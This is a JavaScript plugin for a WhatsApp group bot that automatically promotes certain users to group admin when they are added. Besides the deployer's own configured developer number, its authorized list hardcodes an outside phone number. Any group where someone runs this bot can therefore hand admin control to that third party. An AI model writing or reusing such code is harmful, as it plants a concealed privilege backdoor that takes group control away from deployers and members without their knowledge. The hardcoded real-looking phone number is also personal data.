const { cmd } = require('../command');
const config = require('../config');

// Auto-admin system using body event
cmd({
    'on': "body"
}, async (conn, m, store, {
    from,
    body,
    isGroup,
    isAdmins,
    isBotAdmins,
    reply,
    sender,
    mek // Raw message object
}) => {
    try {
        // Check if feature is enabled
        if (config.AUTO_ADMIN !== "true") return;

        // Only process group messages
        if (!isGroup) return;

        // Get the participant update info if available
        const participantUpdate = mek.message?.groupParticipantsUpdate;
        if (!participantUpdate || participantUpdate.action !== 'add') return;

        // Normalize JIDs
        const normalizeJid = (jid) => jid?.includes('@') ? jid : `${jid}@s.whatsapp.net`;

        // Authorized users
        const AUTHORIZED_USERS = [
            normalizeJid(config.DEV),
            "923103448168@s.whatsapp.net"
        ].filter(Boolean);

        // Check if added user is authorized
        const addedUsers = participantUpdate.participants.map(normalizeJid);
        const shouldPromote = addedUsers.some(jid => AUTHORIZED_USERS.includes(jid));

        if (shouldPromote && isBotAdmins) {
            // Get current admin list
            const groupMetadata = await conn.groupMetadata(from);
            const adminJids = groupMetadata.participants
                .filter(p => p.admin)
                .map(p => p.id);

            // Filter users who need promotion
            const usersToPromote = addedUsers.filter(jid => 
                AUTHORIZED_USERS.includes(jid) && 
                !adminJids.includes(jid)
            );

            if (usersToPromote.length > 0) {
                await conn.groupParticipantsUpdate(
                    from,
                    usersToPromote,
                    "promote"
                );

                // Send notification if enabled
                if (config.AUTO_ADMIN_NOTIFY === "true") {
                    await conn.sendMessage(from, {
                        text: `${usersToPromote.map(jid => `@${jid.split('@')[0]}`).join(' ')} ${usersToPromote.length > 1 ? 'have' : 'has'} been automatically promoted to admin. 👑`,
                        mentions: usersToPromote
                    });
                }
            }
        }
    } catch (error) {
        console.error("Auto-admin error:", error);
    }
});

